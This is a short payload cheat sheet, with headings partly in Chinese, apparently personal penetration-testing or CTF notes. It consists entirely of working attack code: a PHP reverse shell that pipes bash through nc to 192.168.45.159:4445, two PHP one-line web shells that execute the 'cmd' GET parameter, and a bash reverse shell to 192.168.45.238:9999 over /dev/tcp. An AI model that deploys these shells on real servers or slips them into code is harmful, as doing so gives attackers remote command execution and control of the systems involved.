## `PHP` reverse shell
```
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.159 4445 > /tmp/f");
?>
```

## `PHP` 短标签，输出到页面
```
<?=system($_GET["cmd"]);?>
```

## `PHP` 一句话木马

```
<?php system($_GET["cmd"]);?>
```

`BASH` 脚本，reverse shell 的基本格式
```
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.238/9999 0>&1
```
